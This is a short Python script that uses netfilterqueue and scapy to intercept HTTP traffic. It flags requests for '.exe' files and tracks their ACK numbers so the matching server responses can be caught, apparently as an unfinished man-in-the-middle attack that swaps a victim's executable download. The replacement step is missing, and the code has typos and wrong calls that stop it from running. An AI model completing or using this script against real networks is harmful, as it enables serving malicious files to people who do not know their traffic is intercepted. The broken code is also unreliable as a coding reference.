#! /usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import scapy_http

ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("exe Request")
                ack_list.append(scay_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet(scapy.TCP).sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
            print("Rplacing file")
            print(scapy_packet.show())



    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
